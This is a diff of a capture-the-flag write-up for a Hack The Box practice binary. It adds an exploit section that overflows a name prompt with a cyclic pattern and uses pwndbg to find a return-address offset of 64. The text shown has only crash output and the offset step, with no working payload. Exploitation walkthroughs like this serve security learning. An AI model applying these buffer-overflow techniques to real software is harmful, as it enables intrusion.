@@ -8,7 +8,7 @@ We see that the RELRO is full enabled so can't write anything in the GOT table t
 The NX is also enabled, so that means we can't stored input or data cannot be executed as code to perform a shellcode attack.
 ![Alt Text](img/checksec.png)
 
-## View the Source Code
+## View the Source Code and find the vulnerability
 
 We used Ghidra to disassemble the binary.\
 The first thing that we want to do is to go to Functions section and select the main() to see\
@@ -99,3 +99,74 @@ void save_creds(void)
   return;
 }
 ```
+
+## Exploit
+
+First we want to find the offset.\
+We will use pwndbg for this, to create a pattern known as De Bruijn Sequences to fill the padding for the buffer.
+
+```bash
+>> 1                                                                                         
+                                                                                             
+Please tell me your name: leo                                                                
+                                                                                             
+Please tell me your surname: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa                                                         
+Thanks a lot! Here is your lemonade!                                                         
+                                                                                             
+                                                                                             
+Program received signal SIGSEGV, Segmentation fault.                                         
+0x000000000040616a in ?? ()                                                                  
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
+*RAX  0x26
+ RBX  0x0
+*RCX  0x7ffff7910104 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
+*RDX  0x7ffff7bed8c0 ◂— 0x0
+*RDI  0x1
+*RSI  0x7ffff7bec7e3 (_IO_2_1_stdout_+131) ◂— 0xbed8c0000000000a /* '\n' */
+*R8   0x25
+*R9   0x7ffff796eb90 ◂— mov r10, qword ptr [rsi - 0x1e]
+*R10  0x20657361656c500a ('\nPlease ')
+*R11  0x246
+*R12  0x400780 (_start) ◂— xor ebp, ebp
+*R13  0x7fffffffde50 ◂— 0x1
+ R14  0x0
+ R15  0x0
+*RBP  0x6161616161616169 ('iaaaaaaa')
+*RSP  0x7fffffffdd60 —▸ 0x7fffffffdd70 —▸ 0x400c00 (__libc_csu_init) ◂— push r15
+*RIP  0x40616a
+────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────
+Invalid address 0x40616a
+
+
+
+
+
+
+
+
+
+
+──────────────────────────────────────────[ STACK ]──────────────────────────────────────────
+00:0000│ rsp 0x7fffffffdd60 —▸ 0x7fffffffdd70 —▸ 0x400c00 (__libc_csu_init) ◂— push r15
+01:0008│     0x7fffffffdd68 —▸ 0x400bee (main+72) ◂— jmp 0x400bfd
+02:0010│     0x7fffffffdd70 —▸ 0x400c00 (__libc_csu_init) ◂— push r15
+03:0018│     0x7fffffffdd78 —▸ 0x7ffff7821c87 (__libc_start_main+231) ◂— mov edi, eax
+04:0020│     0x7fffffffdd80 ◂— 0x2000000000
+05:0028│     0x7fffffffdd88 —▸ 0x7fffffffde58 —▸ 0x7fffffffe1c0 ◂— '/home/vein/htb/hacktheboo_practise/pwn_lemonade_stand_v1/lemonade_stand_v1'
+06:0030│     0x7fffffffdd90 ◂— 0x100000000
+07:0038│     0x7fffffffdd98 —▸ 0x400ba6 (main) ◂— push rbp
+────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
+ ► 0         0x40616a
+   1   0x7fffffffdd70
+   2         0x400bee main+72
+─────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> aaaaaakaaaaaaalaaaaaaamaaa
+Undefined command: "aaaaaakaaaaaaalaaaaaaamaaa".  Try "help".
+pwndbg> cyclic -l iaaaaaaa
+Finding cyclic pattern of 8 bytes: b'iaaaaaaa' (hex: 0x6961616161616161)
+Found at offset 64
+```
+
+
+
